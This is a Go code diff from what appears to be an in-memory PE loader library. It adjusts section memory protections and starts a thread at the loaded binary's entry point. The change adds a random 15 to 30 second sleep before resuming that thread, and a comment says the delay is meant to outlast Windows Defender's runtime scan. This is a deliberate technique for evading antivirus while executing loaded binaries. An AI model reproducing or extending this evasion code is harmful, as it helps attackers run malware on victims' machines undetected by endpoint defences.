@@ -3,6 +3,7 @@ package lib
 import (
 	"debug/pe"
 	"fmt"
+	"time"
 	. "unsafe"
 
 	log "github.com/sirupsen/logrus"
@@ -216,6 +217,7 @@ func UpdateSectionProtections(api WinAPI, bin BinAPI) (err error) {
 	for _, section := range bin.GetSections() {
 		execFlag = section.MemFlag&0x20 == 0x20
 		writeFlag = section.MemFlag&0x80 == 0x80
+		log.Debugf("Updating %s (%x) mem privileges: exec: %t, write: %t", section.Name, section.Address, execFlag, writeFlag)
 		err = api.VirtualProtect(ptrValue(section.Address), uintptr(section.Size), execFlag, writeFlag)
 		if err != nil {
 			return err
@@ -246,16 +248,22 @@ func FixingHardcodedOffsets(api WinAPI, bin BinAPI) {
 		FixOffsetsInSection(api, bin, section)
 	}
 }
-func StartThread(api WinAPI, bin BinAPI) (err error) {
+
+func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
 
 	entryPoint := bin.GetEntryPoint()
 
-	api.NtFlushInstructionCache(bin.GetAddr())
+	api.NtFlushInstructionCache(bin.GetAddr(), bin.GetImageBase())
 
 	r1, err := api.CreateThread(entryPoint)
 	if err != nil {
 		return err
 	}
+
+	log.Infof("Waiting a few seconds to trip off any runtime scan")
+	time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
+
+	resumeThread.Call(r1)
 	api.WaitForSingleObject(r1)
 	api.CloseHandle(r1)
 
